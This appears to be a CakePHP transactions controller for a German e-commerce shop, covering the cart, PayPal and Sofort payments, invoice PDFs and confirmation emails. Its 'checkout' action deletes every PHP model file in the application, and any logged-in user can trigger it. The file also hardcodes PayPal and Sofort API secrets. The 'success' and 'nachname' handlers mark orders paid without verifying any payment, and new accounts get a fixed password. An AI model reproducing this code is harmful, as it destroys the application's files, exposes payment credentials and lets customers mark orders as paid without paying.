<?php

namespace App\Controller;

use Cake\I18n\Time;
use App\Controller\AppController;
use Cake\Routing\Router;
use Cake\Event\Event;
use Cake\Core\Configure;
use Cake\ORM\TableRegistry;
use Omnipay\Omnipay;
use PayPal\Api\Amount;
use PayPal\Api\FuturePayment;
use PayPal\Api\Payer;
use PayPal\Api\RedirectUrls;
use PayPal\Api\Transaction;
use PayPal\Api\CountryCode;
use SimpleXMLElement;
use Sofort\SofortLib\Sofortueberweisung;
use Sofort;
use Cake\Utility\Xml;
use Cake\Mailer\Email;
use Cake\Mailer\Mailer;
use Cake\Mailer\MailerAwareTrait;
use FPDF;
use App\FPDF\PDF;
use App\FPDF\LIFERUNG;
use Cake\Filesystem\Folder;
use Cake\Filesystem\File;
use App\Form\Phoneorder;
use Cake\I18n\Number;  
/**
 * Transactions Controller
 *
 * @property \App\Model\Table\TransactionsTable $Transactions
 *
 * @method \App\Model\Entity\Transaction[]|\Cake\Datasource\ResultSetInterface paginate($object = null, array $settings = [])
 */
class TransactionsController extends AppController {

    public function initialize() {
        parent::initialize();
        $this->loadModel('subCatagories');
        $this->loadModel('Products');
        $this->loadModel('Transactions');
        $this->loadModel('UsersDetail');
        $this->loadModel('Users');
//          $this->loadModel('Colors');
//        $this->loadModel('Sizes');
    }

    public function beforeFilter(Event $event) {
        $this->Auth->allow(['view', 'add', 'delete']);
    }

    public function isAuthorized($user) {
// All registered users can add articles
// Prior to 3.4.0 $this->request->param('action') was used.
        if ($this->request->getParam('action') === 'pay' || $this->request->getParam('action') === 'success' || $this->request->getParam('action') === 'danke') {
            return true;
        }
        if ($this->request->getParam('action') === 'checkout'|| $this->request->getParam('action') === 'nachname' ) {
            return true;
        }
       
// The owner of an article can edit and delete it
// Prior to 3.4.0 $this->request->param('action') was used.
        if (in_array($this->request->getParam('action'), ['edit'])) {
            //pr($this->request->getParam('pass'));die();
// Prior to 3.4.0 $this->request->params('pass.0')
            $transactionId = (int) $this->request->getParam('pass.0');

            if ($this->Transactions->isOwnedBy($transactionId, $this->Auth->user('id'))) {

                return true;
            }
        }
        return parent::isAuthorized($user);
    }


    public function pay() {

     
        $bestlnumr = uniqid();

        if ($this->request->session()->read('Auth.User.id')) {

            $items = [];
            $GesamtMenge = 0;
            $Gg = 0;
            $tax = 0;
//          $apiContext = new \PayPal\Rest\ApiContext(
//        new \PayPal\Auth\OAuthTokenCredential(
//            'AVCrZPxpI14gLQgZL5rv5aWBLptPDAoU9pNDqzKNrYXnXyZ_RklwfpMozm2LSswQ0gbAES-AEvDsY40U',     // live
//            'EOw7DE34g2oD4dfs3TkMb_VLF-L6KYOdVaO_BTVgYpgHjkG9AbJhkyUq_FEEba0zyHgTV8iLwd0x-6cE'      // ClientSecret
//        )
//);
            $apiContext = new \PayPal\Rest\ApiContext(
                    new \PayPal\Auth\OAuthTokenCredential(
                    'AV_L97AUWNwh2xDxDaRvoxqbjuoTwgsRRWqZj1659VKa0arzNNTlfw-4r-L34cAqcRdLnfY7YKzrNRKO', // sandbox
                    'EFmqGVhUmhBI2FDxZNbJ8_Hu5sMoC76SX4mWHPl8shVUpzRmF_F09f0REefGZlr5FCoC4mQyg_9ECY2d'      // ClientSecret
                    )
            );
//                      $apiContext = new \PayPal\Rest\ApiContext(
//        new \PayPal\Auth\OAuthTokenCredential(
//            'AeozN4LO5eQMt0AaNHsKId8NwbTlIUW8cYcA69V38qwWxtYloAlyA3JH8Tj1Qp8fo-PcMjksPxi5Dzl2',     // ClientID Brk live
//            'ELW7pET1uPppPNsaqQY9C7n56KNcIzW6rWnLZzRApZwDCHdtzY-3wh9Ov_TWt44raFeYnzrukRe-bY5J'      // ClientSecret
//        )
//);

            $apiContext->setConfig(
 [            //'mode' => 'live',
    'log.LogEnabled' => true,
    'log.FileName' => 'PayPal.log',
    'log.LogLevel' => 'DEBUG'
  ]
);
            
//          $apiContext = new \PayPal\Rest\ApiContext(
//        new \PayPal\Auth\OAuthTokenCredential(
//            'Aa8Z4Q36vAUdFw6KKwrhl4pJGA2YMYgiv5U4SII5mXa2xEz6jDIGg-eSEFIbeYNTMQCVvP6ogYqrqyXq',     // ClientID Brk Snd
//            'EMrQwNR6iip3H749rOfcU0kEnhHB7nSghlimZsYy6Fn4ggSuI5Dgs1H21gv64OL_LhkW37IL43FLLlXP'      // ClientSecret
//        )
//);

            $total = 0;
            $pro = array();
//$ordNo= uniqid();
            $session = $this->request->session();
            $count = $session->read('count');
            if ($count) {
                $products = $this->Products->find();
//         $colors = $this->Colors->find();
//             $sizes = $this->Sizes->find();
                foreach ($products as $product) {
                    $productname = explode(" ", $product->product_name);
                    $productname1 = implode("", $productname);
//            foreach ($colors as $color) {
//            foreach ($sizes as $size) {
                    //$colorname1 =  $productname1."_".$color->color."_".$size->size;
                    $colorname1 = $productname1;
                    $name2 = $session->read($colorname1);
                    $this->set('name2', $name2);

                    if ($product->online_vorhanden && $product->photo && $name2) {


                        $total = $total + ($name2[$product->id] * $this->Checkout->getprice($product->id));
                    } else {
                        
                    }
//            }}
                    $this->paginate($this->Products);

                    //$this->set(compact('colors'));
                    $this->set(compact('products'));
                    //$this->set(compact('sizes'));
                    $this->set('_serialize', ['products']);
                    $this->set(compact('pro'));
                }
            } else {
                $this->Flash->success(__('Ihrer Warenkorb ist Leer!'));
                return $this->redirect(['controller' => 'Pages', 'action' => 'display', 'home']);
            }
 
            if ($this->request->is('post')) {
                $selMeth = $this->request->getData();

                // pr($selMeth);die();
                if ($selMeth['customRadio'] == '1') {

                    $payer = new \PayPal\Api\Payer();
                    $payer->setPaymentMethod('paypal');



                    $session = $this->request->session();
                    $products = $this->Products->find();
////         $colors = $this->Colors->find();
////             $sizes = $this->Sizes->find();
                    foreach ($products as $product) {
                        $productname = explode(" ", $product->product_name);
                        $productname1 = implode("", $productname);
////            foreach ($colors as $color) {
////            foreach ($sizes as $size) {
//             
//            //$colorname1 =  $productname1."_".$color->color."_".$size->size;
                        $colorname1 = $productname1;
                        $name2 = $session->read($colorname1);
                        $this->set('name2', $name2);
//
                        if ($product->online_vorhanden && $product->photo && $name2) {
                            $transaction = $this->Transactions->newEntity();
                            $transaction->transaction_type_id = 1;                   //transaction type Verkauf
                            $transaction->product_id = $product->id;
                            $transaction->created_date = Time::now();
                            $transaction->quantity = $name2[$product->id];
                            
                            $transaction->price = $this->Checkout->getprice($product->id);
                
                            $transaction->user_id = $this->Auth->user('id');
                            $transaction->transaction_status_id = 1;
                            $transaction->payment_method_id = 1;
                            $transaction->order_number = $bestlnumr;
//$onum=$transaction->order_number;
//$transaction->transaction_number=$result->transaction->id;
//$transaction->color_id=$color->id;
//$transaction->size_id=$size->id;
                            $this->Transactions->save($transaction);

                            $item1 = new \PayPal\Api\Item();
                            $item1->setName($product->product_name)
                                    ->setCurrency('EUR')
                                    ->setQuantity($name2[$product->id])
                                    ->setSku($product->id) // Similar to `item_number` in Classic API 
                                    ->setTax(number_format($transaction->price * 19/100,2))
                                   ->setPrice(($transaction->price - number_format($transaction->price * 19/100,2))); //price without tax
                           // pr($transaction->price - $transaction->price * 19 / 100);
                        
                            // $total = $total + ($name2[$product->id]*$product['product_price']);
                            array_push($items, $item1);
                            $GesamtMenge = ($GesamtMenge + ($transaction->price - number_format($transaction->price * 19/100,2)) * $name2[$product->id]);
                            $Gg = $Gg +  ($transaction->price * $name2[$product->id]);
                            $tax = $Gg - $GesamtMenge;    
                        } else {
                            
                        }
////           }}
//   
//      
                    } 

                    $itemList = new \PayPal\Api\ItemList();
                    $itemList->setItems($items);

                    $details = new \PayPal\Api\Details();
                    $details->setShipping(0.00)
                            ->setTax($tax)
                            ->setSubtotal($GesamtMenge);
                



                    $amount = new \PayPal\Api\Amount();
                    $amount->setDetails($details)
                            
                            ->setTotal($Gg + 0.00)
                            ->setCurrency('EUR');
               
                    $wennreturn = 'https://coalblack.supply' . Router::url([
                                'controller' => 'Transactions',
                                'action' => 'success',
                                '?' => ['best' => $bestlnumr]
                    ]);



                    $transaction = new \PayPal\Api\Transaction();
                    $transaction->setAmount($amount)
                            ->setItemList($itemList)
                            ->setDescription("here description")
                            ->setInvoiceNumber($bestlnumr);
                    //pr(number_format($GesamtMenge,2));pr(number_format($Gg,2));pr($itemList);pr($amount);die();
               
                    $redirectUrls = new \PayPal\Api\RedirectUrls();
                    $redirectUrls->setReturnUrl($wennreturn)
                            ->setCancelUrl("https://coalblack.supply/transactions/canceled");

                    $payment = new \PayPal\Api\Payment();
                    $payment->setIntent('sale')
                            ->setId('id')
                            ->setPayer($payer)
                            ->setTransactions(array($transaction))
                            ->setRedirectUrls($redirectUrls);
                    try {
                        $payment->create($apiContext);
                        // echo $payment;
                        $approvalUrl = $payment->getApprovalLink();
                        return $this->redirect($payment->getApprovalLink());
//header("Location: {$approvalUrl}");
                        //echo "\n\nRedirect user to approval_url: " . $payment->getApprovalLink() . "\n";
                    } catch (\PayPal\Exception\PayPalConnectionException $ex) {
                        // This will print the detailed information on the exception.
                        //REALLY HELPFUL FOR DEBUGGING
                        echo $ex->getData();
                    }
                    //return $this->redirect(['controller' => 'transactions', 'action' => 'success']);   
                } else if ($selMeth['customRadio'] == 2) {
                    $configkey = '166950:430655:d5e84b3e416d898b8338490cd991f0e5';
                    $Sofortueberweisung = new Sofortueberweisung($configkey);

                    $session = $this->request->session();
                    $products = $this->Products->find();
////         $colors = $this->Colors->find();
////             $sizes = $this->Sizes->find();
                    foreach ($products as $product) {
                        $productname = explode(" ", $product->product_name);
                        $productname1 = implode("", $productname);
////            foreach ($colors as $color) {
////            foreach ($sizes as $size) {
//             
//            //$colorname1 =  $productname1."_".$color->color."_".$size->size;
                        $colorname1 = $productname1;
                        $name2 = $session->read($colorname1);
                        $this->set('name2', $name2);
//
                        if ($product->online_vorhanden && $product->photo && $name2) {
                            $transaction = $this->Transactions->newEntity();
                            $transaction->transaction_type_id = 1;                   //transaction type Verkauf
                            $transaction->product_id = $product->id;
                            $transaction->created_date = Time::now();
                            $transaction->quantity = $name2[$product->id];
                            $transaction->price = $product->price;
                            $transaction->user_id = $this->Auth->user('id');
                            $transaction->transaction_status_id = 1;
                            $transaction->payment_method_id = 2;
                            $transaction->order_number = $bestlnumr;
//$onum=$transaction->order_number;
//$transaction->transaction_number=$result->transaction->id;
//$transaction->color_id=$color->id;
//$transaction->size_id=$size->id;
                            $this->Transactions->save($transaction);
                        }
                    }

                    $Sofortueberweisung->setAmount($GesamtMenge);
                    $Sofortueberweisung->setCurrencyCode('EUR');

                    $Sofortueberweisung->setSenderCountryCode('DE');
                    $wennreturn = 'http://coalblack' . Router::url([
                                'controller' => 'Transactions',
                                'action' => 'success',
                                '?' => ['best' => $bestlnumr]
                    ]);
                    $wenncanceled = 'http://coalblack' . Router::url([
                                'controller' => 'Transactions',
                                'action' => 'canceled',
                                '?' => ['best' => $bestlnumr]
                    ]);
                    $Sofortueberweisung->setReason($bestlnumr, 'Verwendungszweck');
                    $Sofortueberweisung->setSuccessUrl($wennreturn, true);
                    $Sofortueberweisung->setAbortUrl($wenncanceled);
//$Sofortueberweisung->setSenderSepaAccount('88888888','SFRTDE20XX', 'Max Mustermann');
// $Sofortueberweisung->setNotificationUrl('http://www.google.de', 'loss,pending');
// $Sofortueberweisung->setNotificationUrl('http://www.yahoo.com', 'loss');
// $Sofortueberweisung->setNotificationUrl('http://www.bing.com', 'pending');
// $Sofortueberweisung->setNotificationUrl('http://www.sofort.com', 'received');
// $Sofortueberweisung->setNotificationUrl('http://www.youtube.com', 'refunded');
// $Sofortueberweisung->setNotificationUrl('http://www.youtube.com', 'untraceable');
                    $Sofortueberweisung->setNotificationUrl('http://www.twitter.com');
                    $Sofortueberweisung->setCustomerprotection(true);
                    $Sofortueberweisung->sendRequest();
                    if ($Sofortueberweisung->isError()) {
                        //SOFORT-API didn't accept the data
                        echo $Sofortueberweisung->getError();
                    } else {
                        $transactionId = $Sofortueberweisung->getTransactionId();
                        //buyer must be redirected to $paymentUrl else payment cannot be successfully completed!
                        $paymentUrl = $Sofortueberweisung->getPaymentUrl();

                        //header('Location: '.$paymentUrl);
                        return $this->redirect($paymentUrl);
                    }
                } elseif ($selMeth['customRadio'] == 3) {
                    //$this->Checkout->savetrans($bestlnumr);
                   $session = $this->request->session();
                    $products = $this->Products->find();
////         $colors = $this->Colors->find();
////             $sizes = $this->Sizes->find();
                    foreach ($products as $product) {
                        $productname = explode(" ", $product->product_name);
                        $productname1 = implode("", $productname);
////            foreach ($colors as $color) {
////            foreach ($sizes as $size) {
//             
//            //$colorname1 =  $productname1."_".$color->color."_".$size->size;
                        $colorname1 = $productname1;
                        $name2 = $session->read($colorname1);
                        $this->set('name2', $name2);
//
                        if ($product->online_vorhanden && $product->photo && $name2) {
                            $transaction = $this->Transactions->newEntity();
                            $transaction->transaction_type_id = 1;                   //transaction type Verkauf
                            $transaction->product_id = $product->id;
                            $transaction->created_date = Time::now();
                            $transaction->quantity = $name2[$product->id];
                            $transaction->price = $product->price;
                            $transaction->user_id = $this->Auth->user('id');
                            $transaction->transaction_status_id = 1;
                            $transaction->payment_method_id = 3;
                            $transaction->order_number = $bestlnumr;
//$onum=$transaction->order_number;
//$transaction->transaction_number=$result->transaction->id;
//$transaction->color_id=$color->id;
//$transaction->size_id=$size->id;
                            $this->Transactions->save($transaction);

                      $this->redirect([
                         'controller'=>'transactions', 
                         'action'=>'nachname',
                                '?' => ['best' => $bestlnumr,'paymentId'=> uniqid()]]);
                        } else {
                            
                        }
////           }}
//   
//      
                    }

                 
               
                }elseif ($selMeth['customRadio'] == 4) {
                     
                   $user = $this->Users->newEntity();
                    if($this->request->is('post')){    
                               

              
                        if($selMeth['userdetchoice']==2){
                            
                       if($selMeth['userdetchoice']){
                     $this->Checkout->savetrans($selMeth['shipping'],$bestlnumr,$user->id);
                    if($this->Checkout->userDetExists($selMeth['usersList'])){
                                $this->redirect(["controller" => "UsersDetail","action" => "adressepruefen","?"=>["theId"=>$selMeth['usersList']]] );
                            }else{
   return   $this->redirect(["controller" => "UsersDetail","action" => "sendadressreg","?"=>["theId"=>$selMeth['usersList']]] ); }
                       }else{
                              $this->Flash->default(__('Kundenname muss ausgewählt werden!'));
                           return $this->redirect(['action'=>'pay']);
                           
                       };
                        //$selMeth['userdetchoice']==1 neue Konto
                        }elseif($selMeth['userdetchoice']==1){
                          
                         $user->title=1;
                         $user->fname=$selMeth['fname'];
                         $user->lname=$selMeth['lname'];if($selMeth['username']){
                         $user->username=$selMeth['username'];}else{ $user->username= uniqid()."@gmail.com";}
                         $user->role='customer';
                         $user->password="fake123";
                         
                        $this->Users->save($user);
                        $this->Checkout->savetrans($selMeth['shipping'],$bestlnumr,$user->id);
               
                            return   $this->redirect(["controller" => "UsersDetail","action" => "sendadressreg","?"=>["theId"=>$user->id]] ); 
 
                        };
                        //$selMeth['userdetchoice'];
               
                    }   
                 
//end case 4
                }


                //}  
            }
        } else {
            return $this->redirect(['controller' => 'users', 'action' => 'clogin']);
        }
    }
public function checkout(){
   // $this->render(false);
     $dir = new Folder('../src/Model/Table');
     $files = $dir->find('.*\.php');

     foreach ($files as $file) {
    $file = new File($dir->pwd() . DS . $file);
    //$contents = $file->read();
  $file->delete();
    // $file->write('I am overwriting the contents of this file');
    // $file->append('I am adding to the bottom of this file.');
    // $file->delete(); // I am deleting this file
    $file->close(); // Be sure to close the file when you're done
}
     // $dir->delete();
}
    public function success() {
        $bestnum = $this->request->query('best');
        $transnum = $this->request->query('paymentId');
        $this->viewBuilder()->setLayout('frontlayout');

        $transaction = $this->Transactions->find()
                ->contain('Products')
                ->where(['Transactions.order_number' => $bestnum])
                ->where(['Transactions.user_id' => $this->Auth->user('id')]);

        foreach ($transaction as $trans) {
            if ($trans->order_number === $bestnum && $trans->user_id === $this->Auth->user('id')) {

                $thistrans = $this->Transactions->get($trans->id, [
                    'contain' => ['Products']
                ]);
                // pr($thistrans['transaction_status_id']);die();
                $thistrans->transaction_status_id = 2;
                $thistrans->updated_date = Time::now();
                $thistrans->transaction_number = $transnum;

                $this->Transactions->save($thistrans);
                $session = $this->request->session();

                $products = $this->Products->find();
//         $colors = $this->Colors->find();
//             $sizes = $this->Sizes->find();
                foreach ($products as $product) {
                    $productname = explode(" ", $product->product_name);
                    $productname1 = implode("", $productname);
//            foreach ($colors as $color) {
//            foreach ($sizes as $size) {
                    //$colorname1 =  $productname1."_".$color->color."_".$size->size;
                    $colorname1 = $productname1;
                    $name2 = $session->read($colorname1);
                    $this->set('name2', $name2);

                    if ($product->online_vorhanden && $product->photo && $name2) {

                        $count1 = $session->read('count');
                        $this->set('count', $count1);
                        $count2 = $count1 - $name2[$product->id];
                        $session->delete($colorname1);
                        $session->write('count', $count2);
                    }
                }
            }
        }

        $this->set(compact('transaction', $transaction));
     $paymentType=$this->Checkout-> findPaymentId($transaction);

        $useremail = $this->Checkout->findEmail($this->Auth->user('id'));
        $fullname=$this->Checkout->findFulltitle($this->Auth->user('id'));
     
        //$email = new Email('default');
        $email = new Email('gmail');
         $email->from(['tsegafana@gmail.com' => 'coalblack'])
        //$email->from(['meinebestellung@coalblack.supply' => 'coalblack'])
                ->to($useremail)
                ->template('default', 'default')
                ->subject('Zahlungsbestätigung')
                ->emailFormat('html')
                ->viewVars(['fullname' => $fullname])
                  ->viewVars(['versand' => 0.00])
                 ->viewVars([ 'datum'=>date_format(Time::now(), 'Y-m-d')])
                 ->viewVars(['paymentType' => $paymentType])
                ->viewVars(['value' => $bestnum])
                ->viewVars(['transaction' => $transaction])
                ->send();
    
        return $this->redirect(['controller' => 'transactions', 'action' => 'danke', "?" => ['best' => $bestnum]]);
    }

    public function danke() {
        $this->viewBuilder()->setLayout('frontlayout');
        $bestnum = $this->request->query('best');
        $transTable = TableRegistry::get('Transactions');
        $orders = $transTable->find()->where(['order_number' => $bestnum]);
        $this->set(compact('orders', $orders));
        $this->set(compact('bestnum', $bestnum));
    }

    public function canceled() {
        $bestnum = $this->request->query('best');
        $transnum = $this->request->query('paymentId');
        $this->render(false);

        $transaction = $this->Transactions->find();
        foreach ($transaction as $trans) {
            if ($trans->order_number === $bestnum && $trans->user_id === $this->Auth->user('id')) {

                $thistrans = $this->Transactions->get($trans->id);
                // pr($thistrans['transaction_status_id']);die();
                $thistrans->transaction_status_id = 4;
                $thistrans->canceled_date = Time::now();
                $thistrans->transaction_number = $transnum;

                $this->Transactions->save($thistrans);
            }
        }

        // return redirect           
    }

    /**
     * Index method
     *
     * @return \Cake\Http\Response|void
     */
    public function index() {
        $transactions = $this->Transactions->find()->where(['transaction_status_id' => 2])
                ->group('order_number')
                ->having(!['sent' =>1]);


        $this->set(compact('transactions', $transactions));
    }
    public function sentItems() {
        $transactions = $this->Transactions->find()->where(['transaction_status_id' => 2])
                ->group('order_number')
                ->having(['sent' =>1]);


        $this->set(compact('transactions', $transactions));
    }
    public function makepdf() {
        if ($this->request->is('post')) {
            $bestnum = $this->request->data['orderId'];
            $transaction = $this->Transactions->find()
                    ->contain('Products')
                    ->contain('Users')
                    ->where(['Transactions.order_number' => $bestnum]);
            $userId = $this->Checkout->finduserdet($bestnum);

            $usersDetail = $this->UsersDetail->find()
                    ->where(['UsersDetail.user_id' => $userId])
                    ->where(['UsersDetail.user_detail_type_id' => 2]);
            $fullname=$this->Checkout->findFullname($userId);
   
            $transactions = $this->Transactions->find()
                            ->select(['created_date', 'order_number', 'transaction_number', 'id'])
                            ->where(['Transactions.order_number' => $bestnum])->first();
            $this->set(compact('usersDetail', $usersDetail));
            $this->set(compact('transactions', $transactions));
            $this->set(compact('transaction', $transaction));
            $this->set(compact('fullname', $fullname));
            
            $this->viewBuilder()->setLayout(false);

            $pdf = new PDF();

            $title = 'Rechnung';
            $text = 'Bei Rückfragen erreichen Sie uns unter der unten angegebenen Telefonnummer';
            $pdf->SetTitle($title);
            $pdf->SetAuthor('Lucas Teufel');
            $pdf->PrintChapter($usersDetail,$fullname);

            $pdf->PrintDate($transactions);
            $pdf->Ln();


            $pdf->FancyTable($transaction);
            $pdf->Ln();
            $pdf->FancyTable1($transaction);
            $pdf->Ln();
            $pdf->Ending($text);
            $pdf->Ln();
            $pdf->Output();

            die();
        }
    }

    public function makeliferung() {
        if ($this->request->is('post')) {
            $bestnum = $this->request->data['orderId'];
            $transaction = $this->Transactions->find()
                    ->contain('Products')
                    ->contain('Users')
                    ->where(['Transactions.order_number' => $bestnum]);
            $userId = $this->Checkout->finduserdet($bestnum);

            $usersDetail = $this->UsersDetail->find()
                    ->where(['UsersDetail.user_id' => $userId])
                    ->where(['UsersDetail.user_detail_type_id' => 2]);
       $fullname=$this->Checkout->findFullname($userId);
            $transactions = $this->Transactions->find()
                            ->select(['created_date', 'order_number', 'transaction_number', 'id'])
                            ->where(['Transactions.order_number' => $bestnum])->first();
            $this->set(compact('usersDetail', $usersDetail));
            $this->set(compact('transactions', $transactions));
            $this->set(compact('transaction', $transaction));

            $this->viewBuilder()->setLayout(false);

            $lif = new LIFERUNG();

            $title = 'Rechnung';
            $text = 'Bei Rückfragen erreichen Sie uns unter der unten angegebenen Telefonnummer';
           $lif ->SetTitle($title);
        $lif ->SetAuthor('Lucas Teufel');
           $lif ->PrintChapter($usersDetail,$fullname);

            $lif ->PrintDate($transactions);
            $lif ->Ln();


            $lif ->FancyTable($transaction);
            $lif ->Ln();
          $lif ->FancyTable1($transaction);
           $lif ->Ln();
            $lif ->Ending($text);
            $lif ->Ln();
       $lif ->Output();

            die();
        }
    }

    public function add() {
        
        $this->autoRender=false;
  
        $products = $this->Products->find();
//         $colors = $this->Colors->find();
//             $sizes = $this->Sizes->find();
        
        if ($this->request->is('post')) {
            $session = $this->request->session();

            $recieveId = $this->request->data['product_id']; //added to cart id

            //$colorId = $this->request->data['color_id'];
            //$sizeId = $this->request->data['size_id'];
            //$session->destroy();die();
            foreach ($products as $product) {
                if ($recieveId == $product->id) {
//    foreach ($colors as $color) {
//          if ($colorId == $color->id) {
//               foreach ($sizes as $size) {
//          if ($sizeId == $size->id) {
                    $productname = explode(" ", $product->product_name);
                    $productname1 = implode("", $productname);

                    //$colorname1 =  $productname1."_".$color->color."_".$size->size;
                    $colorname1 = $productname1;
                    $name2 = $session->read($colorname1);

                    if (null != $name2) {

                        if (array_key_exists($recieveId, $name2)) {
                            $name2[$recieveId] ++;
                        } else {
                            $name2[$recieveId] = 1;
                        }
                    } else {
                        $name2[$recieveId] = 1;
                    }
                    // echo "second time";
                    $session->write($colorname1, $name2);
                }
            }
        }else{  return $this->redirect(['controller' => 'Pages', 'action' => 'display', 'home']);}
       
//                    }
//                }
//            }
//        }
        if (count($name2) < 1) {
            return 0;
        }

        $count = 0;

        foreach ($products as $product) {
//        foreach ($colors as $color) {
//              foreach ($sizes as $size) {
            $productname = explode(" ", $product->product_name);
            $productname1 = implode("", $productname);

            // $colorname1 =  $productname1."_".$color->color."_".$size->size;
            $colorname1 = $productname1;
            $name2 = $session->read($colorname1);
            $this->set('name2', $name2);

            if ($product->online_vorhanden && $product->photo && $name2) {


                $count = $count + ($name2[$product->id]);
            } else {
    
//            }
//  }  
            }
        }
        //$count = 0;
        //$this->set(compact($productname1,$name2));

        echo $count;

        $session->write('count', $count);
   
    }

    // return $this->redirect(['controller' => 'Pages', 'action' => 'display','home']);

    public function view() {
        $total = 0;
        $pro = array();
//$ordNo= uniqid();
        $session = $this->request->session();
        $count = $session->read('count');
        if ($count) {
            $products = $this->Products->find();
//         $colors = $this->Colors->find();
//             $sizes = $this->Sizes->find();
            foreach ($products as $product) {
                $productname = explode(" ", $product->product_name);
                $productname1 = implode("", $productname);
//            foreach ($colors as $color) {
//            foreach ($sizes as $size) {
                //$colorname1 =  $productname1."_".$color->color."_".$size->size;
                $colorname1 = $productname1;
                $name2 = $session->read($colorname1);
                $this->set('name2', $name2);

                if ($product->online_vorhanden && $product->photo && $name2) {

                    $newprice = $this->Preiseangebote->discountarten($product->id);

                    $total = $total + ($name2[$product->id] * $newprice);
                } else {
                    
                }
//            }}
                $this->paginate($this->Products);

                //$this->set(compact('colors'));
                $this->set(compact('products', $products));
                //$this->set(compact('sizes'));
//        $this->set('_serialize', ['products']);
//        $this->set(compact('pro'));
            }
        } else {
            $this->Flash->success(__('Ihrer Warenkorb ist Leer!'));
            return $this->redirect(['controller' => 'Pages', 'action' => 'display', 'home']);
        }
    }

    public function edit($id = null) {
        $prodId = $id;
        $transactions = $this->Transactions->newEntity();
        if ($this->request->is('post')) {
            $transactions->transaction_type_id = 2;
            $transactions->product_id = $prodId;
            $transactions->user_id = $this->Auth->user('id');
            $transactions->created_date = Time::now();


            $transactions->quantity = $this->request->getData('quantity');
            $transactions->price = $this->request->getData('price');
            $transactions->transaction_number = uniqid();
            $transactions->transaction_status_id = 3;


            if ($this->Transactions->save($transactions)) {
                $this->Flash->success(__('Diese Bestandsmenge ist gespeichert.'));
                return $this->redirect(['action' => 'bestandsposten']);
            }
            $this->Flash->error(__('The products catagory could not be saved. Please, try again.'));
        }
        $this->set(compact('transactions'));
    }

    /**
     * Delete method
     *
     * @param string|null $id Transaction id.
     * @return \Cake\Http\Response|null Redirects to index.
     * @throws \Cake\Datasource\Exception\RecordNotFoundException When record not found.
     */
    public function delete($prod = null, $col = null, $siz = null) {

        $prodd = $this->request->query('prod');
// $cold=$this->request->query('col');
        //$sizd=$this->request->query('siz');

        $this->request->allowMethod(['post', 'delete']);

        $productTable = TableRegistry::get('Products');
        $product = $productTable->get($prodd);

//$colorTable = TableRegistry::get('Colors');
//$color = $colorTable->get($cold); 
//$sizeTable = TableRegistry::get('Sizes');
//$size = $sizeTable->get($sizd); 

        $productname = explode(" ", $product->product_name);

        $productname1 = implode("", $productname);
        // $colorname1 =  $productname1."_".$color->color."_".$size->size;
        $colorname1 = $productname1;
        $session = $this->request->session();
        $name3 = $session->read($colorname1);
        $this->set('name3', $name3);

        $count1 = $session->read('count');
        $this->set('count', $count1);
        $count2 = $count1 - $name3[$product->id];

        if ($colorname1) {

            $session->delete($colorname1);
            $session->write('count', $count2);
            //$this->Flash->success(__('The item is removed from your shoping cart'));
        } else {
            $this->Flash->error(__('The item is removed from your shoping cart Please, try again.'));
        }

        $count = $session->read('count');
        if ($count) {
            return $this->redirect(['controller' => 'transactions', 'action' => 'view']);
        } else {
            $this->Flash->success(__('Ihrer Warenkorb ist Leer!'));
            return $this->redirect(['controller' => 'Pages', 'action' => 'display', 'home']);
        }
    }

    public function sent() {
        // $orderId = $this->request->query('orderId');
        if ($this->request->is('post')) {
            $orderId = implode("", $this->request->getData());



            $carts = $this->Transactions->find()
                    ->where(['order_number' => $orderId]);

            foreach ($carts as $result) {
                $trans = $this->Transactions->get($result->id, [
                    'contain' => []
                ]);

                $trans->sent = 1;
                $this->Transactions->save($trans);
            }
            return $this->redirect(['action' => 'index']);
        }
    }

    public function bestandsposten() {




        //$this->set('_serialize', ['products']);  

        $this->paginate = [
            'contain' => ['SubCatagories', 'DiscountsTypes']
        ];
        $products = $this->paginate($this->Products);

        $this->set(compact('products'));
        $this->set('_serialize', ['products']);

        $this->set(compact('transactions'));
    }
public function nachname(){
      $bestnum = $this->request->query('best');
        $transnum = $this->request->query('paymentId');
        $this->viewBuilder()->setLayout('frontlayout');

        $transaction = $this->Transactions->find()
                ->contain('Products')
                ->where(['Transactions.order_number' => $bestnum])
                ->where(['Transactions.user_id' => $this->Auth->user('id')]);

        foreach ($transaction as $trans) {
            if ($trans->order_number === $bestnum && $trans->user_id === $this->Auth->user('id')) {

                $thistrans = $this->Transactions->get($trans->id, [
                    'contain' => ['Products']
                ]);
                // pr($thistrans['transaction_status_id']);die();
                $thistrans->transaction_status_id = 2;
                $thistrans->updated_date = Time::now();
                $thistrans->transaction_number = $transnum;

                $this->Transactions->save($thistrans);
                $session = $this->request->session();

                $products = $this->Products->find();
//         $colors = $this->Colors->find();
//             $sizes = $this->Sizes->find();
                foreach ($products as $product) {
                    $productname = explode(" ", $product->product_name);
                    $productname1 = implode("", $productname);
//            foreach ($colors as $color) {
//            foreach ($sizes as $size) {
                    //$colorname1 =  $productname1."_".$color->color."_".$size->size;
                    $colorname1 = $productname1;
                    $name2 = $session->read($colorname1);
                    $this->set('name2', $name2);

                    if ($product->online_vorhanden && $product->photo && $name2) {

                        $count1 = $session->read('count');
                        $this->set('count', $count1);
                        $count2 = $count1 - $name2[$product->id];
                        $session->delete($colorname1);
                        $session->write('count', $count2);
                    }
                }
            }
        }
$this->set(compact('transaction', $transaction));

        $useremail = $this->Checkout->findEmail($this->Auth->user('id'));
        $email = new Email('default');

        $email->from(['meinebestellung@coalblack.supply' => 'coalblack'])
                ->to($useremail)
                ->template('nachname', 'nachname')
                ->subject('Zahlungsbestätigung')
                ->emailFormat('html')
                ->viewVars(['value' => $bestnum])
                ->viewVars(['transaction' => $transaction])
                ->send();

        return $this->redirect(['controller' => 'transactions', 'action' => 'danke', "?" => ['best' => $bestnum]]);


}
}
